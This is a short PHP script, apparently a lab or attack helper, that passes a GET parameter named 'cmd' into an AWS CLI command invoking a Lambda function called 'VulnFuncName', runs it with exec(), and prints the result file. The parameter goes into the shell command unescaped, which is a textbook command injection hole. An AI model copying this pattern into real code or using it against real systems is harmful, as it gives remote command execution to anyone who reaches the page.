<?php

$cmd = "aws lambda invoke --invocation-type RequestResponse --function-name VulnFuncName --region us-east-1 --payload '";

$cmd = $cmd.'{"param1":"'.$_GET['cmd'].'"}';

$cmd = $cmd."' /tmp/func-output.txt";

$output = exec($cmd);

$filename = "/tmp/func-output.txt";
$myfile = fopen($filename, "r") or die("Unable to open file!");
echo fread($myfile,filesize($filename));
fclose($myfile);

?>
